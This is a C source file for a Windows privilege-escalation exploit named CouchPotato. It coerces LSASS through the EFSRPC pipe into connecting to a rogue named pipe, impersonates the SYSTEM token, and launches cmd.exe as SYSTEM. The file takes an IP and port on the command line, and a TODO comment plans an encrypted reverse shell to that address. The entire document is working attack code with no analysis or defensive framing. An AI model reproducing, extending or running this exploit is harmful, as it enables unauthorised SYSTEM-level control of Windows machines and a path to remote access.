#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <rpc.h>
#include <stdio.h>
#include "efsr_h.h"

// ── MIDL allocator stubs ─────────────────────────────────────
void* __RPC_USER MIDL_user_allocate(size_t n) {
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}
void __RPC_USER MIDL_user_free(void* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}
void __RPC_USER PEXIMPORT_CONTEXT_HANDLE_rundown(
    PEXIMPORT_CONTEXT_HANDLE ctx) {
    (void)ctx;
}

// ── RPC binding ──────────────────────────────────────────────
static handle_t couch_bind(void) {
    RPC_STATUS st;
    RPC_WSTR sb = NULL;
    handle_t bh = NULL;

    st = RpcStringBindingComposeW(
        (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",  // efsrpc UUID
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)L"\\\\localhost",
        (RPC_WSTR)L"\\pipe\\efsrpc",                         // efsrpc pipe
        NULL, &sb);
    if (st) { printf("[-] Compose: %ld\n", st); return NULL; }

    st = RpcBindingFromStringBindingW(sb, &bh);
    RpcStringFreeW(&sb);
    if (st) { printf("[-] FromString: %ld\n", st); return NULL; }

    st = RpcBindingSetAuthInfoW(bh,
        (RPC_WSTR)L"localhost",
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL, RPC_C_AUTHZ_NONE);
    if (st) { printf("[-] AuthInfo: %ld\n", st); RpcBindingFree(&bh); return NULL; }

    RpcBindingSetOption(bh, 12, 10000);
    return bh;
}

// ── trigger ──────────────────────────────────────────────────
DWORD WINAPI efs_trigger(LPVOID param) {
    printf("[*] Trigger running\n");

    handle_t ht = couch_bind();
    if (!ht) return 1;
    printf("[*] Bound\n");

    long* pUsers = NULL;
    printf("[*] Calling EfsRpcQueryUsersOnFile\n");
    RpcTryExcept{
        long result = EfsRpcQueryUsersOnFile(
            ht,
            L"\\\\localhost/pipe/CouchPotato\\C$\\couch.txt",
            &pUsers
        );
        printf("[*] result: %ld\n", result);
    }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] RPC exception: 0x%lX\n", RpcExceptionCode());
    }
    RpcEndExcept

        RpcBindingFree(&ht);
    return 0;
}

// ── escalation ───────────────────────────────────────────────
VOID efs_escalate(const char* ip, const char* port) {
    HANDLE hpipe = CreateNamedPipeA(
        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
    }
    printf("[+] Pipe ready\n");

    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Trigger started\n");

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hpipe, &ov);

    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(ov.hEvent);

    if (w == WAIT_TIMEOUT) {
        printf("[-] Coercion failed\n");
        CloseHandle(hpipe); return;
    }
    printf("[+] LSASS connected\n");

    if (!ImpersonateNamedPipeClient(hpipe)) {
        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Impersonating SYSTEM\n");

    HANDLE h_ex = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
        printf("[-] OpenThreadToken: %lu\n", GetLastError());
        RevertToSelf(); CloseHandle(hpipe); return;
    }

    HANDLE h_new = NULL;
    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL,
        SecurityImpersonation, TokenPrimary, &h_new)) {
        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
    }
    printf("[+] SYSTEM token duplicated\n");

    // TODO: replace with encrypted reverse shell to ip:port
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessWithTokenW(h_new, 0,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessWithTokenW: %lu\n", GetLastError());
    }
    else {
        printf("[+] SYSTEM shell spawned\n");
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    RevertToSelf();
    CloseHandle(h_ex); CloseHandle(h_new); CloseHandle(hpipe);
}

// ── entry point ──────────────────────────────────────────────
int main(void) {
    LPSTR cmd = GetCommandLineA();
    BOOL q = FALSE; DWORD p = 0;
    while (cmd[p]) {
        if (cmd[p] == '"') q = !q;
        if (cmd[p] == ' ' && !q) break;
        p++;
    }
    while (cmd[p] == ' ') p++;
    char* a = cmd + p;
    char* s = strchr(a, ' ');
    if (!a[0] || !s) { printf("Usage: CouchPotato.exe <ip> <port>\n"); return 1; }

    char ip[16] = { 0 }, port[6] = { 0 };
    strncpy(ip, a, s - a);
    strcpy(port, s + 1);

    printf("[*] CouchPotato\n");
    printf("[*] Callback: %s:%s\n", ip, port);

    efs_escalate(ip, port);
    return 0;
}